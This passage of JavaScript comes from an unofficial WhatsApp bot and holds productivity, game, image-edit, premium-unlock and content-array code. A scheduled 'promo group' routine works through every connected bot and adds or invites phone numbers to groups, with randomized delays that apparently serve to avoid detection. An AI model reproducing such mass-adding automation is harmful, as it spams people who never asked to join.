        if (!cfg.added[botJid]) cfg.added[botJid] = {};
        if (!cfg.skipped[botJid]) cfg.skipped[botJid] = {};
        if (method === "added" || method === "invited") cfg.added[botJid][num] = { at: Date.now(), method };
        else cfg.skipped[botJid][num] = { at: Date.now(), reason };
        await new Promise(r => setTimeout(r, 5000 + Math.floor(Math.random() * 5000)));
    }
    cfg.lastRun[botJid] = Date.now();
    savePromoGroup(cfg);
}
function schedulePromoGroup() {
    setInterval(async () => {
        const cfg = loadPromoGroup();
        if (!cfg.enabled || cfg.paused) return;
        const intervalMs = (cfg.intervalHours || 24) * 3600 * 1000;
        const now = Date.now();
        for (const [, sock] of Object.entries(activeSockets)) {
            if (!sock?.user?.id) continue;
            const botJid = sock.user.id;
            const last = cfg.lastRun[botJid] || 0;
            const offset = botStaggerOffsetMs(botJid, cfg.intervalHours || 24);
            const nextDue = last === 0 ? (now - intervalMs + offset) : (last + intervalMs);
            if (now >= nextDue) {
                runPromoGroupCycleForBot(sock).catch(e => console.log(`[promo] cycle err: ${e?.message}`));
            }
        }
    }, 15 * 60 * 1000);
}

// --- PRODUCTIVITY: REMINDERS / TODOS / NOTES / TIMERS / COUNTDOWNS / CALENDAR ---
const REMINDERS_FILE = path.join(__dirname, "reminders.json");
const TODOS_FILE = path.join(__dirname, "todos.json");
const NOTES_FILE = path.join(__dirname, "notes.json");
const TIMERS_FILE = path.join(__dirname, "timers.json");
const COUNTDOWNS_FILE = path.join(__dirname, "countdowns.json");
function _loadJson(f, def) { if (!fs.existsSync(f)) return def; try { return JSON.parse(fs.readFileSync(f, "utf8")); } catch { return def; } }
function _saveJson(f, d) { try { fs.writeFileSync(f, JSON.stringify(d, null, 2)); } catch {} }
function loadReminders() { return _loadJson(REMINDERS_FILE, []); }
function saveReminders(d) { _saveJson(REMINDERS_FILE, d); }
function loadTodos() { return _loadJson(TODOS_FILE, {}); }
function saveTodos(d) { _saveJson(TODOS_FILE, d); }
function loadNotes() { return _loadJson(NOTES_FILE, {}); }
function saveNotes(d) { _saveJson(NOTES_FILE, d); }
function loadTimers() { return _loadJson(TIMERS_FILE, []); }
function saveTimers(d) { _saveJson(TIMERS_FILE, d); }
function loadCountdowns() { return _loadJson(COUNTDOWNS_FILE, {}); }
function saveCountdowns(d) { _saveJson(COUNTDOWNS_FILE, d); }
function shortId() { return Math.random().toString(36).slice(2, 8); }
function parseDuration(s) {
    if (!s) return 0;
    const str = String(s).toLowerCase().trim();
    let total = 0; let matched = false;
    const re = /(\d+(?:\.\d+)?)\s*(d|day|days|h|hr|hrs|hour|hours|m|min|mins|minute|minutes|s|sec|secs|second|seconds|w|wk|wks|week|weeks)/g;
    let m;
    while ((m = re.exec(str)) !== null) {
        matched = true;
        const n = parseFloat(m[1]); const u = m[2];
        if (/^w/.test(u)) total += n * 7 * 24 * 3600 * 1000;
        else if (/^d/.test(u)) total += n * 24 * 3600 * 1000;
        else if (/^h/.test(u)) total += n * 3600 * 1000;
        else if (/^m/.test(u)) total += n * 60 * 1000;
        else if (/^s/.test(u)) total += n * 1000;
    }
    if (!matched) {
        const justNum = parseFloat(str);
        if (!isNaN(justNum)) total = justNum * 60 * 1000;
    }
    return total;
}
function fmtDuration(ms) {
    if (ms < 0) ms = 0;
    const d = Math.floor(ms / 86400000); ms -= d * 86400000;
    const h = Math.floor(ms / 3600000); ms -= h * 3600000;
    const m = Math.floor(ms / 60000); ms -= m * 60000;
    const s = Math.floor(ms / 1000);
    const out = [];
    if (d) out.push(`${d}d`); if (h) out.push(`${h}h`); if (m) out.push(`${m}m`);
    if (!d && !h && s) out.push(`${s}s`); else if (!d && !h && !m) out.push("0s");
    return out.join(" ") || "0s";
}
function armReminder(entry, getSock) {
    const wait = Math.max(0, entry.fireAt - Date.now());
    setTimeout(async () => {
        try {
            const arr = loadReminders();
            const still = arr.find(r => r.id === entry.id);
            if (!still) return;
            const s = getSock();
            if (s) {
                const mention = entry.userJid ? `@${entry.userJid.split("@")[0]}` : "";
                await s.sendMessage(entry.chatJid, { text: `⏰ *Reminder${mention ? ` for ${mention}` : ""}*\n\n${entry.text}`, mentions: entry.userJid ? [entry.userJid] : [] });
            }
            saveReminders(loadReminders().filter(r => r.id !== entry.id));
        } catch (e) { console.log(`[reminder] err: ${e?.message}`); }
    }, wait).unref?.();
}
function rearmAllReminders() {
    for (const e of loadReminders()) armReminder(e, () => {
        for (const [, s] of Object.entries(activeSockets)) if (s?.user?.id === e.botJid) return s;
        return Object.values(activeSockets)[0] || null;
    });
}
function armTimer(entry, getSock) {
    const wait = Math.max(0, entry.fireAt - Date.now());
    setTimeout(async () => {
        try {
            const arr = loadTimers();
            const still = arr.find(r => r.id === entry.id);
            if (!still) return;
            const s = getSock();
            if (s) {
                await s.sendMessage(entry.chatJid, { text: `⏱️ *Timer done!*${entry.label ? `\n\n${entry.label}` : ""}` });
            }
            saveTimers(loadTimers().filter(r => r.id !== entry.id));
        } catch {}
    }, wait).unref?.();
}
function rearmAllTimers() {
    for (const e of loadTimers()) armTimer(e, () => {
        for (const [, s] of Object.entries(activeSockets)) if (s?.user?.id === e.botJid) return s;
        return Object.values(activeSockets)[0] || null;
    });
}
function buildCalendar(year, month, marks = {}) {
    const first = new Date(year, month, 1);
    const startDow = first.getDay();
    const days = new Date(year, month + 1, 0).getDate();
    const monthName = first.toLocaleString("en-US", { month: "long" });
    const today = new Date();
    const isCurMonth = today.getFullYear() === year && today.getMonth() === month;
    let out = `🗓️ *${monthName} ${year}*\n━━━━━━━━━━━━━━━━━━━━\n`;
    out += `Su Mo Tu We Th Fr Sa\n`;
    let line = "";
    for (let i = 0; i < startDow; i++) line += "   ";
    for (let day = 1; day <= days; day++) {
        const isToday = isCurMonth && today.getDate() === day;
        const mk = marks[day];
        const cell = isToday ? `[${String(day).padStart(2, "0")}]` : (mk ? `*${String(day).padStart(2, "0")}` : ` ${String(day).padStart(2, "0")}`);
        line += cell.padEnd(3, " ");
        if ((startDow + day) % 7 === 0) { out += line + "\n"; line = ""; }
    }
    if (line.trim()) out += line + "\n";
    if (Object.keys(marks).length) {
        out += `\n*Events:*\n`;
        for (const [day, label] of Object.entries(marks)) out += `• ${monthName} ${day} — ${label}\n`;
    }
    return out;
}

// --- AI PERSONA ---
const PERSONA_FILE = path.join(__dirname, "persona.json");
function loadPersonas() { return _loadJson(PERSONA_FILE, {}); }
function savePersonas(d) { _saveJson(PERSONA_FILE, d); }
function getPersona(scopeJid) { return loadPersonas()[scopeJid] || ""; }
function setPersona(scopeJid, text) { const d = loadPersonas(); d[scopeJid] = text; savePersonas(d); }
function clearPersona(scopeJid) { const d = loadPersonas(); delete d[scopeJid]; savePersonas(d); }
async function callGemini(prompt, opts = {}) {
    const KEY = process.env.GEMINI_API_KEY;
    if (!KEY) throw new Error("GEMINI_API_KEY not set. Add it from https://aistudio.google.com/app/apikey");
    const model = opts.model || "gemini-2.0-flash";
    const sys = opts.system ? [{ text: opts.system }] : [];
    const body = JSON.stringify({
        contents: [{ parts: sys.concat([{ text: prompt }]) }],
        generationConfig: { temperature: opts.temperature ?? 0.7 },
    });
    return new Promise((resolve, reject) => {
        const req = https.request({
            hostname: "generativelanguage.googleapis.com",
            path: `/v1beta/models/${model}:generateContent?key=${KEY}`,
            method: "POST",
            headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) },
        }, (res) => {
            let data = ""; res.on("data", c => data += c);
            res.on("end", () => {
                try {
                    const p = JSON.parse(data);
                    const t = p?.candidates?.[0]?.content?.parts?.[0]?.text;
                    if (t) resolve(t.trim()); else reject(new Error(p?.error?.message || "Empty response"));
                } catch (e) { reject(e); }
            });
        });
        req.on("error", reject); req.write(body); req.end();
    });
}

// --- TTS (Google Translate free endpoint, multi-language) ---
async function googleTts(text, lang = "en") {
    const safe = String(text || "").slice(0, 200);
    const url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(safe)}&tl=${encodeURIComponent(lang)}&client=tw-ob&ttsspeed=1`;
    return await fetchBuffer(url);
}

// --- IMAGE EDITOR (sharp + external for removebg/upscale/cartoon) ---
let _sharp = null;
function getSharp() { if (!_sharp) try { _sharp = require("sharp"); } catch (e) { throw new Error("sharp not installed"); } return _sharp; }
async function applyImageOp(buf, op, args = {}) {
    const sharp = getSharp();
    const img = sharp(buf, { failOn: "none" });
    switch (op) {
        case "blur": return await img.blur(Number(args.amount) || 8).toBuffer();
        case "invert": return await img.negate({ alpha: false }).toBuffer();
        case "grayscale": return await img.grayscale().toBuffer();
        case "brighten": return await img.modulate({ brightness: Number(args.amount) || 1.4 }).toBuffer();
        case "darken": return await img.modulate({ brightness: Number(args.amount) || 0.6 }).toBuffer();
        case "sharpen": return await img.sharpen({ sigma: Number(args.amount) || 2 }).toBuffer();
        case "pixelate": {
            const meta = await img.metadata();
            const px = Math.max(4, Math.floor((meta.width || 400) / (Number(args.amount) || 30)));
            return await sharp(buf, { failOn: "none" })
                .resize(px, null, { kernel: "nearest" })
                .resize(meta.width, meta.height, { kernel: "nearest" })
                .toBuffer();
        }
        case "cartoon": {
            return await img.median(3).modulate({ saturation: 1.6 }).sharpen({ sigma: 2 }).toBuffer();
        }
        default: throw new Error(`unknown op: ${op}`);
    }
}
async function removeBgRemote(buf) {
    const KEY = process.env.REMOVE_BG_API_KEY;
    if (KEY) {
        const fd = new FormData();
        fd.append("image_file", new Blob([buf]), "image.png");
        fd.append("size", "auto");
        const res = await fetch("https://api.remove.bg/v1.0/removebg", { method: "POST", headers: { "X-Api-Key": KEY }, body: fd });
        if (!res.ok) throw new Error(`remove.bg HTTP ${res.status}`);
        return Buffer.from(await res.arrayBuffer());
    }
    throw new Error("REMOVE_BG_API_KEY not set. Add a free key from remove.bg (50 free/month) to enable .removebg.");
}
async function upscaleRemote(buf) {
    throw new Error("Upscaling needs an external API key. Set DEEPAI_API_KEY (free tier at deepai.org) to enable .upscale.");
}

// --- GAMES: state for new games ---
const akinatorState = {};
const guessFlagState = {};
const mathState = {};
const newScrambleState = {};
const typingTestState = {};
const connect4State = {};
const werewolfState = {};
const FLAGS = [
    { e: "🇳🇬", n: "Nigeria" }, { e: "🇬🇭", n: "Ghana" }, { e: "🇰🇪", n: "Kenya" }, { e: "🇿🇦", n: "South Africa" },
    { e: "🇪🇬", n: "Egypt" }, { e: "🇲🇦", n: "Morocco" }, { e: "🇪🇹", n: "Ethiopia" }, { e: "🇸🇳", n: "Senegal" },
    { e: "🇺🇸", n: "United States" }, { e: "🇬🇧", n: "United Kingdom" }, { e: "🇨🇦", n: "Canada" }, { e: "🇲🇽", n: "Mexico" },
    { e: "🇧🇷", n: "Brazil" }, { e: "🇦🇷", n: "Argentina" }, { e: "🇨🇴", n: "Colombia" }, { e: "🇨🇱", n: "Chile" },
    { e: "🇫🇷", n: "France" }, { e: "🇩🇪", n: "Germany" }, { e: "🇮🇹", n: "Italy" }, { e: "🇪🇸", n: "Spain" },
    { e: "🇵🇹", n: "Portugal" }, { e: "🇳🇱", n: "Netherlands" }, { e: "🇧🇪", n: "Belgium" }, { e: "🇨🇭", n: "Switzerland" },
    { e: "🇸🇪", n: "Sweden" }, { e: "🇳🇴", n: "Norway" }, { e: "🇩🇰", n: "Denmark" }, { e: "🇫🇮", n: "Finland" },
    { e: "🇷🇺", n: "Russia" }, { e: "🇺🇦", n: "Ukraine" }, { e: "🇵🇱", n: "Poland" }, { e: "🇹🇷", n: "Turkey" },
    { e: "🇨🇳", n: "China" }, { e: "🇯🇵", n: "Japan" }, { e: "🇰🇷", n: "South Korea" }, { e: "🇮🇳", n: "India" },
    { e: "🇵🇰", n: "Pakistan" }, { e: "🇮🇩", n: "Indonesia" }, { e: "🇵🇭", n: "Philippines" }, { e: "🇹🇭", n: "Thailand" },
    { e: "🇻🇳", n: "Vietnam" }, { e: "🇲🇾", n: "Malaysia" }, { e: "🇸🇬", n: "Singapore" }, { e: "🇦🇺", n: "Australia" },
    { e: "🇳🇿", n: "New Zealand" }, { e: "🇸🇦", n: "Saudi Arabia" }, { e: "🇦🇪", n: "United Arab Emirates" }, { e: "🇮🇱", n: "Israel" },
];
const TYPING_SENTENCES = [
    "The quick brown fox jumps over the lazy dog near the river bank.",
    "Phantom X is the most powerful WhatsApp bot ever built in Nigeria.",
    "Coding is fun when you ship features that real people actually use.",
    "Never give up on your dreams because every legend was once a beginner.",
    "Practice makes perfect but consistency makes a champion in any field.",
];
const WEREWOLF_ROLES = ["villager", "villager", "villager", "werewolf", "seer", "doctor"];

// --- CONNECT4 helpers ---
function newC4Board() { return Array.from({ length: 6 }, () => Array(7).fill(0)); }
function renderC4(board) {
    const map = { 0: "⚪", 1: "🔴", 2: "🟡" };
    let out = "1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣\n";
    for (const row of board) out += row.map(c => map[c]).join("") + "\n";
    return out;
}
function c4Drop(board, col, p) {
    for (let r = 5; r >= 0; r--) { if (board[r][col] === 0) { board[r][col] = p; return r; } }
    return -1;
}
function c4Wins(board, p) {
    const lines = [[0,1],[1,0],[1,1],[1,-1]];
    for (let r = 0; r < 6; r++) for (let c = 0; c < 7; c++) for (const [dr, dc] of lines) {
        let cnt = 0;
        for (let i = 0; i < 4; i++) { const nr = r + dr*i, nc = c + dc*i; if (nr<0||nr>=6||nc<0||nc>=7) break; if (board[nr][nc]!==p) break; cnt++; }
        if (cnt === 4) return true;
    }
    return false;
}

// --- PREMIUM / UNLOCK SYSTEM ---
const PREMIUM_FILE = path.join(__dirname, "premium.json");
function loadPremium() { if (!fs.existsSync(PREMIUM_FILE)) return {}; try { return JSON.parse(fs.readFileSync(PREMIUM_FILE, "utf8")); } catch { return {}; } }
function savePremium(d) { fs.writeFileSync(PREMIUM_FILE, JSON.stringify(d, null, 2)); }
function hasPremiumAccess(senderJid, cmd) {
    const data = loadPremium();
    const num = (senderJid || "").replace(/@s\.whatsapp\.net|@g\.us/, "").split(":")[0];
    const cmdKey = (cmd || "").toLowerCase();
    // locked_for check comes FIRST — overrides any premium grant
    const lockedFor = data.locked_for || {};
    const isLockedForNum = (entry) => entry === "all" || (Array.isArray(entry) && (entry.includes("all") || entry.includes(num)));
    if (isLockedForNum(lockedFor["allcmds"])) return false;
    if (isLockedForNum(lockedFor[cmdKey])) return false;
    // Grant checks
    if (data.global_unlock) return true;
    const premNums = data.premium_numbers || [];
    if (premNums.includes(num)) return true;
    const unlocked = data.unlocked_cmds || {};
    const isUnlocked = (entry) => entry === "all" || (Array.isArray(entry) && (entry.includes("all") || entry.includes(num)));
    if (isUnlocked(unlocked["allcmds"])) return true;
    if (isUnlocked(unlocked[cmdKey])) return true;
    return false;
}
function setLockedFor(num, cmd, lock = true) {
    const data = loadPremium();
    if (!data.locked_for) data.locked_for = {};
    const key = (cmd || "").toLowerCase();
    if (lock) {
        if (!Array.isArray(data.locked_for[key])) data.locked_for[key] = [];
        if (!data.locked_for[key].includes(num)) data.locked_for[key].push(num);
    } else {
        if (Array.isArray(data.locked_for[key])) {
            data.locked_for[key] = data.locked_for[key].filter(n => n !== num);
            if (data.locked_for[key].length === 0) delete data.locked_for[key];
        }
    }
    savePremium(data);
}
function setPremiumNumber(num, add = true) {
    const data = loadPremium();
    if (!data.premium_numbers) data.premium_numbers = [];
    if (add) { if (!data.premium_numbers.includes(num)) data.premium_numbers.push(num); }
    else { data.premium_numbers = data.premium_numbers.filter(n => n !== num); }
    savePremium(data);
}
function unleashCmd(cmd, target) {
    // cmd = "allcmds" | ".specific"   target = "all" | "2348012345678"
    const data = loadPremium();
    if (!data.unlocked_cmds) data.unlocked_cmds = {};
    const key = cmd.toLowerCase();
    if (target === "all") {
        data.unlocked_cmds[key] = "all";
    } else {
        if (!Array.isArray(data.unlocked_cmds[key])) data.unlocked_cmds[key] = [];
        if (!data.unlocked_cmds[key].includes(target)) data.unlocked_cmds[key].push(target);
    }
    savePremium(data);
}
function lockCmd(cmd) {
    const data = loadPremium();
    if (!data.unlocked_cmds) { savePremium(data); return; }
    if (cmd === "allcmds") { data.unlocked_cmds = {}; data.global_unlock = false; data.premium_numbers = []; }
    else { delete data.unlocked_cmds[cmd.toLowerCase()]; }
    savePremium(data);
}

// --- SILENCED NUMBERS (dev can silence specific numbers per bot) ---
const SILENCE_FILE = path.join(__dirname, "silenced.json");
function loadSilenced() { if (!fs.existsSync(SILENCE_FILE)) return {}; try { return JSON.parse(fs.readFileSync(SILENCE_FILE, "utf8")); } catch { return {}; } }
function saveSilenced(d) { fs.writeFileSync(SILENCE_FILE, JSON.stringify(d, null, 2)); }
function isSilenced(botJid, senderJid) { const d = loadSilenced(); const num = (senderJid || "").replace(/@s\.whatsapp\.net|@g\.us/, "").split(":")[0]; return (d[botJid || "global"] || []).includes(num); }
function addSilenced(botJid, num) { const d = loadSilenced(); const key = botJid || "global"; if (!d[key]) d[key] = []; if (!d[key].includes(num)) d[key].push(num); saveSilenced(d); }
function removeSilenced(botJid, num) { const d = loadSilenced(); const key = botJid || "global"; if (d[key]) { d[key] = d[key].filter(n => n !== num); saveSilenced(d); } }

// --- EXTRA DEV NUMBERS (addable at runtime via .adddev) ---
const EXTRA_DEV_FILE = path.join(__dirname, "extra_devs.json");
function loadExtraDevs() { if (!fs.existsSync(EXTRA_DEV_FILE)) return []; try { return JSON.parse(fs.readFileSync(EXTRA_DEV_FILE, "utf8")); } catch { return []; } }
function saveExtraDevs(d) { fs.writeFileSync(EXTRA_DEV_FILE, JSON.stringify(d, null, 2)); }
function getRuntimeDevNumbers() { return [...DEV_NUMBERS, ...loadExtraDevs()]; }
function isRuntimeDev(jid) { if (!jid) return false; const num = jid.replace(/@s\.whatsapp\.net|@g\.us/, "").split(":")[0]; return getRuntimeDevNumbers().includes(num); }

// --- GAME STATE (hangman, trivia, numguess, scramble) ---
const hangmanState = {};
const triviaState = {};
const numGuessState = {};
const scrambleState = {};

// --- RANDOM CONTENT ARRAYS ---
const JOKES = [
    "Why don't scientists trust atoms? Because they make up everything! 😂",
    "I told my wife she was drawing her eyebrows too high. She looked surprised. 😂",
    "Why do cows wear bells? Because their horns don't work! 🐄",
    "I asked my dog what two minus two is. He said nothing. 🐶",
    "Why can't you give Elsa a balloon? Because she'll let it go! ❄️",
    "What do you call a fake noodle? An impasta! 🍝",
    "Why did the scarecrow win an award? He was outstanding in his field! 🌾",
    "I'm reading a book about anti-gravity. It's impossible to put down! 📚",
    "Why did the bicycle fall over? Because it was two-tired! 🚲",
    "What do you call cheese that isn't yours? Nacho cheese! 🧀",
    "Why did the math book look so sad? It had too many problems! 📖",
    "I used to hate facial hair but then it grew on me! 😂",
    "How do you organize a space party? You planet! 🚀",
    "Why don't eggs tell jokes? They'd crack each other up! 🥚",
    "What do you call a sleeping dinosaur? A dino-snore! 🦕",
];
const FACTS = [
    "🧠 Humans share 50% of their DNA with bananas.",
    "🐘 Elephants are the only animals that can't jump.",
    "🌍 Nigeria is home to more English speakers than England itself.",
    "🦈 Sharks are older than trees — they've existed for 450 million years.",
    "🍯 Honey never expires. 3000-year-old honey found in Egyptian tombs was still edible.",
    "🌙 A day on Venus is longer than a year on Venus.",
    "🦋 Butterflies taste with their feet.",
    "💡 The lighter was invented before the match.",
    "🐙 Octopuses have three hearts and blue blood.",
    "🌊 The ocean covers 71% of Earth but 95% of it is still unexplored.",
    "🧲 A teaspoon of neutron star would weigh 6 billion tonnes.",
    "🐌 Snails can sleep for up to 3 years.",
    "🎵 Music can trigger the same brain response as food or sex.",
    "📱 The first iPhone was released in 2007. WhatsApp didn't exist until 2009.",
    "🌿 There are more trees on Earth than stars in the Milky Way.",
];
const QUOTES = [
    "💬 \"The secret of getting ahead is getting started.\" — Mark Twain",
    "💬 \"In the middle of every difficulty lies opportunity.\" — Albert Einstein",
    "💬 \"It does not matter how slowly you go as long as you do not stop.\" — Confucius",
    "💬 \"Success is not final; failure is not fatal: it is the courage to continue that counts.\" — Churchill",
    "💬 \"Believe you can and you're halfway there.\" — Theodore Roosevelt",
    "💬 \"The only way to do great work is to love what you do.\" — Steve Jobs",
    "💬 \"Don't watch the clock; do what it does. Keep going.\" — Sam Levenson",
    "💬 \"An investment in knowledge pays the best interest.\" — Benjamin Franklin",
    "💬 \"The future belongs to those who believe in the beauty of their dreams.\" — Eleanor Roosevelt",
    "💬 \"You miss 100% of the shots you don't take.\" — Wayne Gretzky",
    "💬 \"Hard work beats talent when talent doesn't work hard.\" — Tim Notke",
    "💬 \"The man who has no imagination has no wings.\" — Muhammad Ali",
    "💬 \"Fall seven times, stand up eight.\" — Japanese Proverb",
    "💬 \"No pressure, no diamonds.\" — Thomas Carlyle",
    "💬 \"A smooth sea never made a skilled sailor.\" — Franklin D. Roosevelt",
];
const ROASTS = [
    "📵 Your WiFi signal has a better connection than your personality.",
    "🧠 I'd roast you, but my mum said I'm not allowed to burn trash.",
    "👁️ You have the face of a saint — a Saint Bernard.",
    "📚 You're proof that evolution can go in reverse.",
    "💤 I'd agree with you, but then we'd both be wrong.",
    "🪟 If laughter is the best medicine, your face must be curing diseases.",
    "🏃 You're not stupid; you just have bad luck thinking.",
    "🎭 I've seen better looking things crawl out of soup.",
    "🕹️ You're like a software update. Whenever I see you, I think 'not now'.",
    "📉 You have miles to go before you reach mediocre.",
    "🎪 Your brain must be the size of a pebble. Cute, but useless.",
    "🔋 You have the energy of a dying phone battery.",
    "🗑️ I'd insult your intelligence, but I'm not sure you have any.",
    "😴 You're so boring even your phone goes to sleep around you.",
    "🌚 I'm not saying I hate you, but I'd unplug your life support for a charger.",
];
const COMPLIMENTS = [
    "🌟 You are genuinely one of the most amazing people in this group!",
    "💛 Your energy brightens up every conversation you're in. Keep shining!",
    "🏆 You have the kind of intelligence that makes the room smarter.",
    "🌸 You're the human equivalent of a warm cup of tea on a cold day.",
    "🎯 You have an incredible ability to make people feel heard and valued.",
    "🚀 Honestly? The world is better because you're in it.",
    "💎 You're rare. Not everybody has the depth of character you carry.",
    "🧠 You think in a way most people can't — and that's your superpower.",
    "🔥 You work harder than 90% of people and it shows. Respect.",
    "🌺 Your kindness is contagious. People leave conversations with you feeling better.",
    "⚡ You have a vibe that can't be faked. Stay real.",
    "👑 You're built different. Don't ever let anyone dim that.",
    "🌍 Your potential is literally limitless. Chase it.",
    "💯 You're exactly the kind of person people are grateful to know.",
    "🕊️ You make people feel safe. That's a rare and powerful gift.",
];
const EIGHTBALL = [
    "✅ It is certain.", "✅ Without a doubt.", "✅ Yes definitely!",
    "✅ You may rely on it.", "✅ As I see it, yes.", "✅ Most likely.",
    "🤷 Reply hazy, try again.", "🤷 Ask again later.", "🤷 Better not tell you now.",
    "🤷 Cannot predict now.", "🤷 Concentrate and ask again.",
    "❌ Don't count on it.", "❌ My reply is no.", "❌ My sources say no.",
    "❌ Outlook not so good.", "❌ Very doubtful.",
];
const HANGMAN_WORDS = ["phantom","nigeria","whatsapp","telegram","javascript","keyboard","elephant","football","lightning","champion","universe","sunshine","waterfall","mountain","butterfly","network","software","wireless","password","keyboard","government","tropical","abundance","satellite","emergency","community","democracy","education","knowledge","adventure","celebrate","discovery","excellent","beautiful","integrity","creativity","hurricane","evolution","migration","resilience"];
const TRIVIA_QUESTIONS = [
    { q: "What is the capital of Nigeria?", a: "abuja", hint: "It starts with A" },
    { q: "How many states does Nigeria have?", a: "36", hint: "It's a number between 35 and 37" },
    { q: "What year did Nigeria gain independence?", a: "1960", hint: "Think early 1960s" },
    { q: "What is 15 × 15?", a: "225", hint: "It's greater than 200" },
    { q: "Which planet is known as the Red Planet?", a: "mars", hint: "Named after the Roman god of war" },
    { q: "What is the largest ocean on Earth?", a: "pacific", hint: "It's the biggest" },
    { q: "How many sides does a hexagon have?", a: "6", hint: "Between 5 and 7" },
    { q: "What is the chemical symbol for gold?", a: "au", hint: "From the Latin word 'aurum'" },
    { q: "Who invented the telephone?", a: "bell", hint: "His last name is also a sound" },
    { q: "What is the fastest land animal?", a: "cheetah", hint: "Spotted big cat" },
    { q: "What gas do plants absorb?", a: "co2", hint: "Also written as carbon dioxide" },
    { q: "What is the boiling point of water in Celsius?", a: "100", hint: "Triple digits" },
    { q: "Which country has the largest population?", a: "india", hint: "South Asian country" },
    { q: "What is 8 squared?", a: "64", hint: "Between 60 and 70" },
    { q: "Who wrote Romeo and Juliet?", a: "shakespeare", hint: "Famous English playwright" },
];
const RIDDLES = [
    { q: "I speak without a mouth and hear without ears. I have no body but come alive with wind. What am I?", a: "echo", hint: "You hear me after you speak" },
    { q: "The more you take, the more you leave behind. What am I?", a: "footsteps", hint: "Think about walking" },
    { q: "I have cities but no houses. Mountains but no trees. Water but no fish. What am I?", a: "map", hint: "You use me to find places" },
    { q: "What can you catch but never throw?", a: "cold", hint: "It makes you sneeze" },
    { q: "I'm tall when young, short when old. What am I?", a: "candle", hint: "I give off light and melt" },
    { q: "What has hands but can't clap?", a: "clock", hint: "You check me for the time" },
    { q: "What gets wetter the more it dries?", a: "towel", hint: "You use it after a shower" },
    { q: "What has many keys but can't open a single lock?", a: "keyboard", hint: "You're typing on one right now... maybe" },
    { q: "I have a head, a tail, but no body. What am I?", a: "coin", hint: "You flip me for decisions" },
    { q: "What goes up but never comes down?", a: "age", hint: "Everyone has this and it always increases" },
    { q: "I'm light as a feather but even the strongest person can't hold me for more than a minute. What am I?", a: "breath", hint: "You're doing it right now" },
    { q: "What runs but never walks, has a mouth but never talks, has a bed but never sleeps?", a: "river", hint: "Flows through nature" },
    { q: "The more you have of me, the less you see. What am I?", a: "darkness", hint: "Turn the lights off" },
    { q: "What can travel around the world while staying in a corner?", a: "stamp", hint: "Found on envelopes" },
];

const WOULD_U_RATHER = [
    "Would you rather be able to fly OR be invisible?",
    "Would you rather lose your phone for a week OR your wallet for a week?",
    "Would you rather have no internet for a month OR no WhatsApp forever?",
    "Would you rather be famous but poor OR rich but unknown?",
    "Would you rather always speak your mind OR never speak again?",
    "Would you rather live without music OR live without social media?",
    "Would you rather know when you'll die OR how you'll die?",
    "Would you rather be 10 years older OR 10 years younger?",
    "Would you rather have super strength OR super speed?",
    "Would you rather eat jollof rice every day OR never eat jollof rice again?",
    "Would you rather be able to talk to animals OR speak every human language?",
    "Would you rather never use your phone again OR never watch TV again?",
    "Would you rather have $1 million now OR $5 million in 10 years?",
    "Would you rather always be cold OR always be hot?",
    "Would you rather be the funniest person OR the smartest person in the room?",
];

const HOROSCOPES = {
    aries:       "🐏 *Aries (Mar 21 – Apr 19)*\n\n🔥 Today your energy is unstoppable. A bold move you've been hesitating on is worth taking. Trust your gut — confidence is your superpower right now.",
    taurus:      "🐂 *Taurus (Apr 20 – May 20)*\n\n🌿 Slow down and enjoy today. Good things are building behind the scenes. Don't rush — your patience will pay off more than you expect.",
    gemini:      "👯 *Gemini (May 21 – Jun 20)*\n\n💨 Your mind is sharp and your words carry weight today. A conversation you have could open a new door. Stay curious.",
    cancer:      "🦀 *Cancer (Jun 21 – Jul 22)*\n\n🌊 Emotions run deep today. Protect your peace — not everyone deserves access to your energy. Focus on people who reciprocate your love.",
    leo:         "🦁 *Leo (Jul 23 – Aug 22)*\n\n☀️ You're in your element. People are watching and taking notes. This is your moment to lead and shine — own it.",
    virgo:       "♍ *Virgo (Aug 23 – Sep 22)*\n\n📋 Your attention to detail saves the day. Something that seemed messy is becoming clearer. Trust the process you've been working on.",
    libra:       "⚖️ *Libra (Sep 23 – Oct 22)*\n\n🎨 Balance is key today. A situation that felt unfair may find resolution. Beauty, harmony and peace are drawn to you right now.",
    scorpio:     "🦂 *Scorpio (Oct 23 – Nov 21)*\n\n🔮 Deep insights are coming. What seemed hidden is being revealed. Use your instincts — you already know more than you think.",
    sagittarius: "🏹 *Sagittarius (Nov 22 – Dec 21)*\n\n🌟 Adventure is calling. You're being pulled toward something bigger. Say yes to new experiences — growth is waiting.",
    capricorn:   "🐐 *Capricorn (Dec 22 – Jan 19)*\n\n🏔️ Discipline wins today. Stay focused on your goals and ignore the noise. The hard work you've been putting in is closer to payoff than you think.",
    aquarius:    "🏺 *Aquarius (Jan 20 – Feb 18)*\n\n⚡ You're ahead of your time and people are starting to notice. Share your ideas — your unique thinking is your greatest asset.",
    pisces:      "🐟 *Pisces (Feb 19 – Mar 20)*\n\n🌙 Trust your dreams and intuition today. A creative idea or feeling you've dismissed deserves another look. Magic is in the details.",
};

const SCRAMBLE_WORDS = [
    { word: "phantom", hint: "👻 A ghost-like entity" },
    { word: "nigeria", hint: "🌍 A West African country" },
    { word: "android", hint: "🤖 A mobile operating system" },
    { word: "football", hint: "⚽ The world's most popular sport" },
    { word: "telegram", hint: "📱 A messaging app" },
    { word: "music", hint: "🎵 Sound organized in time" },
    { word: "laptop", hint: "💻 A portable computer" },
    { word: "jungle", hint: "🌿 A thick tropical forest" },
    { word: "diamond", hint: "💎 The hardest natural material" },
    { word: "chicken", hint: "🐔 A common farm bird" },
    { word: "airport", hint: "✈️ Where planes take off and land" },
    { word: "market", hint: "🛒 A place to buy and sell" },
    { word: "ocean", hint: "🌊 A massive body of saltwater" },
    { word: "kingdom", hint: "👑 A land ruled by a king or queen" },
    { word: "battery", hint: "🔋 Stores electrical energy" },
    { word: "thunder", hint: "⛈️ The loud sound after lightning" },
    { word: "glasses", hint: "👓 Used to correct eyesight" },
    { word: "blanket", hint: "🛏️ Keeps you warm while sleeping" },
    { word: "village", hint: "🏡 A small rural settlement" },
    { word: "captain", hint: "⚓ Leader of a ship or team" },
];

// Saved group names: { groupJid: groupName }
const groupNames = {};

// Auto-react: { groupJid: emoji }
const AUTO_REACT_FILE = path.join(__dirname, "auto_react.json");
function loadAutoReact() { if (!fs.existsSync(AUTO_REACT_FILE)) return {}; try { return JSON.parse(fs.readFileSync(AUTO_REACT_FILE, "utf8")); } catch { return {}; } }
